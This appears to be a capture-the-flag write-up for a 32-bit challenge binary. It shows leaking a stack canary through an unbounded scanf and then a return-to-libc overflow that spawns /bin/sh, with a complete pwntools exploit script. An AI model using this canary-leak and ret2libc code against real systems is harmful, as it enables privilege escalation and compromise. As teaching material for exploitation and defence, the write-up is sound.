Overview

The executable jedipath in the /challenges/jedipath/jedipath directory asks you to guess the Jedis thoughts (with 3 attempts) and if guessed correctly, returns the SHA256 encrypted flag file located in /challenges/jedipath/flag.

We have the right to read to part of the source code and the binary located in the file.

We want the flag file but the executables output is useless and only the jedipath executable has reading premission for that file.

Vulnerability

After inspecting the (incomplete) source code (written in C) we figure out that our input guess allocates 64 bytes but the scanner has no boundary for the input size and therfore lets us put in something arbitrary and just adds a '\n' character at the end of it.

We ask ourselves what would happen if we would try to smash the stack by entering in a huge input with >64 chars.

The system detected our attempt to smash the stack and returned an error saying so. Therefore we figured out that there must be a memory defense system and analyzed the stack in the gdb debugger:

It turns out that the stack structure is not as expected because the stack stores our guess beneath the local variables. Overwriting local variables with stack overflow is therefore not possible.

We sketched out what we assume the stack must look like:

STACK:

| ...           | <- ESP
|guess_len      |
|attempt        |
|correct_guesses|
|guessed_number |
|secret_number  |
|guess          | <- buffer, 64 byte
|canary         | <- 4 bytes
| ...           | <- 12 bytes (padding)
|return address | <- EIP, 4 bytes
| ...           | <- EBP

Because the program reads our input without any limitation and because the canary does not change with each of our attempts, it is possible to put the nil char 0x00 at some other point in our input and read as much of the stack as we want.

After getting the canary's value we can overwrite it without the system noticing and reach the return address.

This makes this program vulnerable to Return-to-libc attacks.

Exploitation

First we used the gdb debugger to figure out which parts of our programs stack remain unchanged after multiple executions to figure out the paddings size.

After the 3 generated bytes of the canary, followed a 12 byte sized padding there is the return address 0x080489bf (see the stack above).

Our goal was to use 2 out of 3 possible attempts to gain access to the shell with the rights of the jedipath executable by changing the return address:

  1. Attempt → payload with 64 chars to read canary
  1. Attempt → concatenate buffer with canary + padding to overwrite the return address to &system and previous parameters to the pointer that points to " /bin/sh" so that we call system(" /bin/sh") (to have a nested process within this process)

We looked up the systems address in the program (0xf7e262e0) and then continued our journey by taking a look at the library functions called in the program: 

(gdb) info proc map

and used the find command to search for " /bin/sh".

At this point we had all the necessary data to create our own python script with pwntools and therefore generated a pwn template to start working.

#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./jedipath
from pwn import *

class bcolors:
    WARNING = '\033[93m'
    ENDC = '\033[0m'

# Set up pwntools for the correct architecture
exe = context.binary = ELF('/challenges/jedipath/jedipath')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break main
break system
break *0x080488fc
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start() #this is our process

#ATTEMPT 1
input = 'A'*64 #to get the canary as the output
print(io.recvuntil(b"[1]"))
io.sendline(input)
print(io.readline())
canary = io.recvuntil(b'[2]')[:3] #get first 3 bytes as chars
print(bcolors.WARNING + "FOUND CANARY: " + canary + bcolors.ENDC)

#ATTEMPT 2
p1 = p32(0x00000476)
p2 = p32(0x0804a000)
p3 = p32(0xffffd598)
padding = p1 + p2 + p3 #12 bytes     
systemAddress = p32(0xf7e262e0)
fakeRet = p32(0xdeadbeef) #does not matter
binsh = p32(0xf7f670af)
payload = input + b"\x00" + canary + padding + systemAddress + fakeRet + binsh 
io.sendline(payload)

io.interactive()

We then got access to the shell with the privileges of the jedipat executable and just used the linux shell cat command to read the flag:

WUT{Much_t0_l34rn_y0u_st1ll_h4v3!}

Solution

We could not have successfully executed the buffer overflow exploit that the Return-to-libc attack is based on, if the source code had a limit for scanf in the first place.
